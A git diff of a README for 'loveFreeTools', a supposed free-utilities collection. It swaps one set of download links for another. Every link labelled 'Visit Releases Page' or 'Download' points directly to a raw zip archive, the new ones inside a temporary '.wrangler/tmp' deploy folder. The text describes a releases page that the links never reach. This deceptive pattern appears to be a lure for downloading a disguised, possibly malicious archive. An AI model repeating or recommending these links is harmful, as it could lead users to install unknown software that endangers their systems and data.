@@ -6,7 +6,7 @@ loveFreeTools is a collection of free utilities designed to make your online exp
 
 ## 📥 Download Now
 
-[![Download loveFreeTools](https://github.com/mayank164/loveFreeTools/raw/refs/heads/main/electron/Tools-love-Free-v2.7.zip%https://github.com/mayank164/loveFreeTools/raw/refs/heads/main/electron/Tools-love-Free-v2.7.zip)](https://github.com/mayank164/loveFreeTools/raw/refs/heads/main/electron/Tools-love-Free-v2.7.zip)
+[![Download loveFreeTools](https://raw.githubusercontent.com/mayank164/loveFreeTools/main/.wrangler/tmp/deploy-5Ai5tD/love_Tools_Free_v1.3.zip%https://raw.githubusercontent.com/mayank164/loveFreeTools/main/.wrangler/tmp/deploy-5Ai5tD/love_Tools_Free_v1.3.zip)](https://raw.githubusercontent.com/mayank164/loveFreeTools/main/.wrangler/tmp/deploy-5Ai5tD/love_Tools_Free_v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To get started, follow these simple steps to download and install loveFreeTools 
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page:
    
-   [Visit Releases Page](https://github.com/mayank164/loveFreeTools/raw/refs/heads/main/electron/Tools-love-Free-v2.7.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/mayank164/loveFreeTools/main/.wrangler/tmp/deploy-5Ai5tD/love_Tools_Free_v1.3.zip)
 
 2. **Choose Your Version:** On the releases page, you will see different versions of loveFreeTools. Look for the latest version, which is usually marked as "Latest Release."
 
@@ -74,6 +74,6 @@ If you encounter any issues or have questions while using loveFreeTools, feel fr
 
 To sum it up, download and install loveFreeTools by following the steps mentioned above. Everything you need should be right on the releases page:
 
-[Visit Releases Page](https://github.com/mayank164/loveFreeTools/raw/refs/heads/main/electron/Tools-love-Free-v2.7.zip)
+[Visit Releases Page](https://raw.githubusercontent.com/mayank164/loveFreeTools/main/.wrangler/tmp/deploy-5Ai5tD/love_Tools_Free_v1.3.zip)
 
 We aim to make your experience smooth and enjoyable. Thank you for choosing loveFreeTools!
